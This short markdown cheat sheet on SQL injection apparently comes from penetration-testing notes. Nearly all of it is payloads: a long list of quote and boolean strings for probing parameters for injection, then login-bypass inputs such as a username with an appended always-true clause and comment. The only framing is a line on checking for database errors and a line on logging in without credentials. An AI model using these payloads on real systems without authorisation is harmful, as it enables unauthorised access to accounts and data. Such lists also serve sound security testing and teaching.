# SQL Injection

## Basic technique

Stick `'` in a parameter and see if it throws a database error (and note what kind).

Another simple test:

```
' or '1'='1
```

Other tests:

```
-'
' '
'&'
'^'
'*'
' or ''-'
' or '' '
' or ''&'
' or ''^'
' or ''*'
"-"
" "
"&"
"^"
"*"
" or ""-"
" or "" "
" or ""&"
" or ""^"
" or ""*"
or true--
" or true--
' or true--
") or true--
') or true--
' or 'x'='x
') or ('x')=('x
')) or (('x'))=(('x
" or "x"="x
") or ("x")=("x
")) or (("x"))=(("x
```

## Bypassing authentication

If you find a poorly-sanitized login page, you can attempt to log in without credentials by injecting the username parameter:

```
username' or 1=1;#
username'-
```
